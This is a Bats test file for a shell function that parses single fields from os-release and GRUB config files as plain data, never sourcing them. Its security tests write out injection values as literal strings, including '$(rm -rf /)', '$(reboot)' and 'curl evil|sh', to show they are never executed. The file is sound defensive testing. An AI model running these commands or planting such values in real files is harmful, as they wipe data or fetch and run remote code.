#!/usr/bin/env bats
#
# Dual contract for read_keyval_field: it parses one KEY=VALUE field from
# os-release / grub-default as DATA and must reproduce exactly what `source`
# would have extracted for every LEGITIMATE distro form (flexibility — quoted,
# unquoted, CRLF, inline comments, embedded '='), while NEVER executing the
# value (security — under --root these files come from an untrusted target
# image; $(...), backticks, ${VAR} and ;|& must be returned as literal bytes).
#
# The function never `source`s the file. These tests pin both halves so a
# refactor cannot reintroduce sourcing (RCE) nor collapse a multi-token value
# to its first word (corrupting BLS titles / kernel cmdlines).

load helper

F=

setup() {
    load_installer
    F="${BATS_TEST_TMPDIR}/osr"
}

# ===========================================================================
# flexibility — real distro forms must parse like `source` did
# ===========================================================================

@test "flex: double-quoted PRETTY_NAME with spaces/parens/slash (Debian 13)" {
    printf '%s\n' 'PRETTY_NAME="Debian GNU/Linux 13 (trixie)"' > "$F"
    lb read_keyval_field "$F" PRETTY_NAME
    [ "$output" = "Debian GNU/Linux 13 (trixie)" ]
}

@test "flex: double-quoted dotted version + LTS (Ubuntu 24.04)" {
    printf '%s\n' 'PRETTY_NAME="Ubuntu 24.04.1 LTS"' > "$F"
    lb read_keyval_field "$F" PRETTY_NAME
    [ "$output" = "Ubuntu 24.04.1 LTS" ]
}

@test "flex: unquoted single-token ID (Debian/Ubuntu/Arch ship ID bare)" {
    printf '%s\n' 'ID=debian' > "$F"
    lb read_keyval_field "$F" ID
    [ "$output" = "debian" ]
}

@test "flex: double-quoted ID + dotted VERSION_ID (RHEL family)" {
    printf '%s\n%s\n' 'ID="rhel"' 'VERSION_ID="9.4"' > "$F"
    lb read_keyval_field "$F" ID
    [ "$output" = "rhel" ]
    lb read_keyval_field "$F" VERSION_ID
    [ "$output" = "9.4" ]
}

@test "flex: hyphenated quoted ID (openSUSE Leap)" {
    printf '%s\n' 'ID="opensuse-leap"' > "$F"
    lb read_keyval_field "$F" ID
    [ "$output" = "opensuse-leap" ]
}

@test "flex: single-quoted multi-token GRUB cmdline" {
    printf '%s\n' "GRUB_CMDLINE_LINUX_DEFAULT='quiet splash'" > "$F"
    lb read_keyval_field "$F" GRUB_CMDLINE_LINUX_DEFAULT
    [ "$output" = "quiet splash" ]
}

@test "flex: double-quoted cmdline with multiple embedded '=' tokens" {
    printf '%s\n' 'GRUB_CMDLINE_LINUX="rd.luks.uuid=abc rhgb quiet audit=1"' > "$F"
    lb read_keyval_field "$F" GRUB_CMDLINE_LINUX
    [ "$output" = "rd.luks.uuid=abc rhgb quiet audit=1" ]
}

@test "flex: value beginning with root=/dev/... (first '=' splits only)" {
    printf '%s\n' 'GRUB_CMDLINE_LINUX="root=/dev/sda1 ro"' > "$F"
    lb read_keyval_field "$F" GRUB_CMDLINE_LINUX
    [ "$output" = "root=/dev/sda1 ro" ]
}

@test "flex: content after the closing double quote is dropped (match-to-quote)" {
    printf '%s\n' 'GRUB_CMDLINE_LINUX="quiet splash" # note' > "$F"
    lb read_keyval_field "$F" GRUB_CMDLINE_LINUX
    [ "$output" = "quiet splash" ]
}

@test "flex: non-space junk glued to the closing quote is truncated" {
    printf '%s\n' 'FOO="bar"junk' > "$F"
    lb read_keyval_field "$F" FOO
    [ "$output" = "bar" ]
}

@test "flex: unquoted value with an inline ' # comment' (source drops it)" {
    printf '%s\n' 'FOO=bar # hello' > "$F"
    lb read_keyval_field "$F" FOO
    [ "$output" = "bar" ]
}

@test "flex: '#' with no preceding space is part of the value" {
    printf '%s\n' 'FOO=bar#baz' > "$F"
    lb read_keyval_field "$F" FOO
    [ "$output" = "bar#baz" ]
}

@test "flex: unquoted multi-word value with no comment kept whole (NAME=Arch Linux)" {
    printf '%s\n' 'NAME=Arch Linux' > "$F"
    lb read_keyval_field "$F" NAME
    [ "$output" = "Arch Linux" ]
}

@test "flex: one trailing space on an unquoted value is trimmed" {
    printf '%s\n' 'FOO=bar ' > "$F"
    lb read_keyval_field "$F" FOO
    [ "$output" = "bar" ]
}

@test "flex: '#' inside single quotes is data, not a comment" {
    printf '%s\n' "FOO='a # b'" > "$F"
    lb read_keyval_field "$F" FOO
    [ "$output" = "a # b" ]
}

@test "flex: CRLF double-quoted value has its trailing CR stripped" {
    printf 'PRETTY_NAME="Ubuntu 24.04.1 LTS"\r\nVERSION_ID="24.04"\r\n' > "$F"
    lb read_keyval_field "$F" PRETTY_NAME
    [ "$output" = "Ubuntu 24.04.1 LTS" ]
    lb read_keyval_field "$F" VERSION_ID
    [ "$output" = "24.04" ]
}

@test "flex: CRLF unquoted value is CR-clean" {
    printf 'ID=fedora\r\n' > "$F"
    lb read_keyval_field "$F" ID
    [ "$output" = "fedora" ]
}

@test "flex: last assignment of a repeated key wins (source semantics)" {
    printf '%s\n%s\n' 'ID=debian' 'ID=ubuntu' > "$F"
    lb read_keyval_field "$F" ID
    [ "$output" = "ubuntu" ]
}

@test "flex: leading spaces before KEY still match" {
    printf '%s\n' '   FOO=bar' > "$F"
    lb read_keyval_field "$F" FOO
    [ "$output" = "bar" ]
}

@test "flex: leading TAB before KEY still matches" {
    printf '\tID=fedora\n' > "$F"
    lb read_keyval_field "$F" ID
    [ "$output" = "fedora" ]
}

@test "flex: empty double-quoted value returns empty (not the quotes)" {
    printf '%s\n' 'VERSION_ID=""' > "$F"
    lb read_keyval_field "$F" VERSION_ID
    [ -z "$output" ]
}

@test "flex: bare 'KEY=' (empty unquoted) returns empty" {
    printf '%s\n' 'VERSION_ID=' > "$F"
    lb read_keyval_field "$F" VERSION_ID
    [ -z "$output" ]
}

@test "flex: querying a key the distro omits returns empty, rc 0 (Arch VERSION_ID)" {
    printf '%s\n%s\n' 'ID=arch' 'PRETTY_NAME="Arch Linux"' > "$F"
    lb read_keyval_field "$F" VERSION_ID
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

@test "flex: absent/unreadable file yields empty, rc 0" {
    lb read_keyval_field "${BATS_TEST_TMPDIR}/nope/os-release" ID
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

@test "flex: VERSION vs VERSION_ID do not collide (literal '=' in anchor)" {
    printf '%s\n%s\n' 'VERSION="13 (trixie)"' 'VERSION_ID="13"' > "$F"
    lb read_keyval_field "$F" VERSION_ID
    [ "$output" = "13" ]
    lb read_keyval_field "$F" VERSION
    [ "$output" = "13 (trixie)" ]
}

# ===========================================================================
# security — injection vectors must be returned as inert literal bytes
# ===========================================================================

@test "sec: unquoted command substitution is literal, never executed" {
    printf '%s\n' 'PRETTY_NAME=$(rm -rf /)' > "$F"
    lb read_keyval_field "$F" PRETTY_NAME
    [ "$output" = '$(rm -rf /)' ]
}

@test "sec: double-quoted command substitution is literal (not the output of id)" {
    printf '%s\n' 'PRETTY_NAME="$(id)"' > "$F"
    lb read_keyval_field "$F" PRETTY_NAME
    [ "$output" = '$(id)' ]
}

@test "sec: backtick command substitution is returned verbatim" {
    printf '%s\n' 'PRETTY_NAME=`whoami`' > "$F"
    lb read_keyval_field "$F" PRETTY_NAME
    [ "$output" = '`whoami`' ]
}

@test "sec: \$(...) hidden in a trailing comment after the value is dropped, not run" {
    printf '%s\n' 'GRUB_CMDLINE_LINUX="quiet" # $(reboot)' > "$F"
    lb read_keyval_field "$F" GRUB_CMDLINE_LINUX
    [ "$output" = "quiet" ]
}

@test "sec: \${VAR} parameter expansion is literal (HOME not consulted)" {
    export HOME=/root
    printf '%s\n' 'PRETTY_NAME="${HOME}/x"' > "$F"
    lb read_keyval_field "$F" PRETTY_NAME
    [ "$output" = '${HOME}/x' ]
}

@test "sec: shell metacharacters in an unquoted value stay literal data" {
    printf '%s\n' 'ID=debian; curl evil|sh' > "$F"
    lb read_keyval_field "$F" ID
    [ "$output" = 'debian; curl evil|sh' ]
}
